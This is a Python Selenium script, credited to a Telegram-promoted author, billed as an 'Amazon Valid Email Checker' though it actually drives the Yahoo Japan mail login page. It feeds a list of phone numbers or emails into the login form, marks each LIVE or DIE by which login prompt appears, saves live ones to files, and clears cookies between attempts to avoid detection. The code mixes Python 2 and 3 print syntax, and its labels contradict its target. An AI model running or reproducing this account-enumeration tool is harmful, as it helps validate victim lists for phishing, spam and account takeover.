from time import sleep
from selenium.webdriver.common.by import By
from selenium import webdriver
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support import expected_conditions as ec
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
import socket
import random
import sys
import os
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool
from operator import truediv
def clear():
    linux = 'clear'
    windows = 'cls'
    os.system([linux, windows][os.name == 'nt'])
   

print("_"*50)
print"        [+] Amazon Valid Email Checker 2022 [+] "
print"        Coded by : rootinabox"
print"        Contact me at :"
print"        Channel : https://t.me/Rootinabox_Channel"
print"        Telegram : @rootinabox"
print("_"*50)
print" "
print"Usage ---> python amazon_checker.py list.txt"
print""


old_number=[]
link = 'https://mail.yahoo.co.jp/'
chrome_options = webdriver.ChromeOptions();
chrome_options.add_argument("--log-level=3")
chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
# chrome_options.add_argument("--headless")
driver = webdriver.Chrome(executable_path="chromedriver.exe", chrome_options=chrome_options)
for phone in open(sys.argv[1],'r').readlines():
 try:
  phone=phone.strip().replace(' ','').replace('\n','')
  if phone in old_number:
    print(phone+" old checked")
    continue
  driver.get(link)
  sleep(1)
  try:
    inpt=driver.find_element(By.XPATH,'//input[@name="login"][@id="username"]')
    submit=driver.find_element(By.XPATH,'//button[@id="btnNext"][@type="submit"]')
    inpt.send_keys(phone)
    submit.click()
    sleep(2)
    try:
      password = driver.find_element(By.XPATH,'//div[contains(@id,"pwdWrap")and not(contains(@class,"heightNone"))]')
      print("\033[32;1mLIVE\033[0m | "+phone+" | [Amazon.co.jp Email  ]")
      open('YahooBounceLive.txt','a').write(phone+"\n")
    except Exception as e:
        try:
            passwordsss = driver.find_element(By.XPATH,'//div[contains(@id,"sendCodeMessageBox")and not(contains(@class,"dispNone"))]')
            print("\033[32;1mLIVE\033[0m | "+phone+" | [Amazon.co.jp Email  ]")
            open('5KYahooBounceLive.txt','a').write(phone+"\n")
            driver.delete_all_cookies()
        except Exception as e:
            print("\033[31;1mDIE\033[0m | "+phone+" | [ Amazon.co.jp Email  ]")
            driver.delete_all_cookies()
            driver.get('chrome://settings/clearBrowserData')
            sleep(3)
            actions = ActionChains(driver) 
            actions.send_keys(Keys.TAB * 7 + Keys.ENTER) # confirm
            actions.perform()
            sleep(3)
  except Exception as e:
     print(phone+" error")
 except Exception as e:
   print(e)
   